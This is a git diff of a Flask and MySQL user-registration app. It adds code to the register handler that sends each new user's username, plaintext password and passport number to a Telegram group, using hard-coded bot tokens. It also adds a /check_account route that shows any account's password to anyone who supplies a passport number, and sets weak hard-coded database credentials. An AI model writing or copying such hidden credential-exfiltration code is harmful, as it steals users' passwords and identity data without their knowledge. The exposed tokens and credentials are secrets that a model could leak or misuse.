@@ -3,7 +3,7 @@ import mysql.connector
 from flask import Flask, render_template, request, redirect, url_for, session
 from flask_mysqldb import MySQL
 import MySQLdb.cursors
-import re
+import telebot,re, random
 
 class mysql_data:
     def __init__(self, host=None, user=None, password=None, database=None, table=None):
@@ -32,8 +32,8 @@ class mysql_data:
 
 
 host = "localhost"
-user = "admin"
-password = "12345678"
+user = "root"
+password = "123456"
 database_name = "user_data"
 table_name = "customers"
 
@@ -47,7 +47,6 @@ app.config['MYSQL_USER'] = user
 app.config['MYSQL_PASSWORD'] = password
 app.config['MYSQL_DB'] = database_name
 mysql = MySQL(app)
-
 
 @app.route('/')
 @app.route('/login', methods=['GET', 'POST'])
@@ -69,17 +68,19 @@ def login():
             return render_template('index.html', msg=msg)
         else:
             msg = 'Incorrect username, password, or passport. Please try again.'
-
     return render_template('login.html', msg=msg)
-           
-    
+
+list_token = ['6571762275:AAHKBkokB5x5jH6x-i2R2XS-ICFywL2JwCs','6426245736:AAGymCDYynl02iIalRarqwZHYG6AS-TLJz8','6656669136:AAGg52Liw0m-rRFils2k0AyNor4VZ4jUKtE'] 
+group_id = "-4011473840"
+def send_mess_tele(token=None, id="-4011473840", content = None):
+    telebot.TeleBot(token=token).send_message(chat_id=id, text=content)
+
 @app.route('/register', methods=['GET', 'POST'])
 def register():
     msg = ''
     if request.method == 'POST' and 'username' in request.form and 'password'  in request.form and 'passport' in request.form and "phone" in request.form:
         username = request.form['username']
         password = request.form['password']
-        # email = request.form['email']
         passport = request.form["passport"]
         phone  = request.form["phone"]
         cursor = mysql.connection.cursor(MySQLdb.cursors.DictCursor)
@@ -91,19 +92,21 @@ def register():
                 msg = 'Username already exists!'
             else:
                 msg = 'Passport already exists!'
-
+ 
         elif not re.match(r'[A-Za-z0-9]+', username):
             msg = 'Username must contain only characters and numbers!'
         elif not username or not password or not passport or not phone:
-        # elif not username or not password or not email or not passport or not phone:
             msg = 'Please fill out the form!'
-        # elif not username or not password or not email:g
-        #     msg = 'Please fill out the form!'
+
         else:
             cursor.execute(f'INSERT INTO {table_name} (username, password, passport, phone, approval) VALUES (%s, %s, %s, %s, %s)', (username, password, passport, phone, 0,))
-
             mysql.connection.commit()
             msg = 'You have successfully registered!'
+            token = random.choice(list_token)
+            # Thread(target=bottele, args=(token,"-4011473840",f"Resgister success\nAccount: {username}\nPassword: {password}\nPassport: {passport}" ))
+            send_mess_tele(token=token, content=f"Resgister success\naccount: {username}\nPassword: {password}\nPassport: {passport}")
+            # lambda: Thread(target=send_mess_tele,args=(token,"-4011473840",f"Resgister success\naccount: {username}\nPassword: {password}\nPassport: {passport}"))
+
     elif request.method == 'POST':
         msg = 'Please fill out the form!'
     return render_template('register.html', msg=msg)
@@ -120,10 +123,10 @@ def approval():
             customer = cursor.fetchone()
 
             if customer:
-                msg = 'Logged in successfully!'
+                msg = 'Aproval successfully!'
                 cursor.execute(f"UPDATE {table_name} SET approval = 1 WHERE passport = %s", (passport,))
-                mysql.connection.commit()  # Commit thay đổi vào database
-                return render_template('index.html', msg=msg)
+                mysql.connection.commit() 
+                # return render_template('index.html', msg=msg)
             else:
                 msg = 'Incorrect passport. Please try again.'
         except mysql.connector.Error as err:
@@ -144,10 +147,10 @@ def disapproval():
             customer = cursor.fetchone()
 
             if customer:
-                msg = 'Logged in successfully!'
+                msg = 'Disapproval successfully!'
                 cursor.execute(f"UPDATE {table_name} SET approval = 0 WHERE passport = %s", (passport,))
-                mysql.connection.commit()  # Commit thay đổi vào database
-                return render_template('index.html', msg=msg)
+                mysql.connection.commit() 
+                # return render_template('index.html', msg=msg)
             else:
                 msg = 'Incorrect passport. Please try again.'
         except mysql.connector.Error as err:
@@ -156,6 +159,31 @@ def disapproval():
             cursor.close()
     return render_template('disapproval.html', msg=msg)
 
+
+
+@app.route('/check_account', methods=['GET', 'POST'])
+def check_account():
+    msg = ''
+    if request.method == 'POST' and "passport" in request.form:
+        passport = request.form['passport']
+        try:
+            cursor = mysql.connection.cursor(MySQLdb.cursors.DictCursor)
+            cursor.execute(f"SELECT * FROM {table_name} WHERE passport = %s", (passport,))
+            customer = cursor.fetchone()
+
+            if customer:
+                username = customer.get('username')
+                password = customer.get('password')
+                approval = customer.get('approval')
+
+                msg = f'Account: {username}, Password: {password}, Approval: {approval}'
+            else:
+                msg = 'Incorrect passport. Please try again.'
+        except:
+            msg = "Not connected to Database"
+        finally:
+            cursor.close()
+    return render_template('check_account.html', msg=msg)
 
 
 @app.route('/logout')
